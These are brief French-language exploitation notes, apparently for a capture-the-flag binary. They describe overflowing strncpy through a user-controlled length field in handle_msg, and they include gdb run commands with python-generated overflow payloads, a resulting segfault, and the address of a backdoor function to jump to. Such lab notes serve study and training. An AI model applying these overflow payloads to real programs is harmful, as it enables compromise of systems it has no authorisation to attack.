(int *)(a1 + 180) dans le strncpy a cette adresse memoire on peut mettre une variable qui va overflow le strncpy
Mettre le int a un caractere dans le user

Va ecrire \xff dans la heap qui va provoquer un buffer overflow
run <<< $(python -c 'print "\xff" * 49 + "\xff"'; python -c 'print "S" * 1000')
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()

=> b *0x00005555555549cb pour check la heap et le overflow
0x000055555555488c l adresse de backdoor
run <<< $(python -c 'print "\x41" * 40 + "\xff"' && python -c 'print "\x42" * 290 + "\x41"')

le 41eme caractere est le nombre qui sera dans strncpy

// Compter les caracteres dans le s qui va provoquer le bufferoverflow (strncpy((char *)a1, s, *(int *)(a1 + 180));)

// Ou sinon utiliser gef a la place de gdb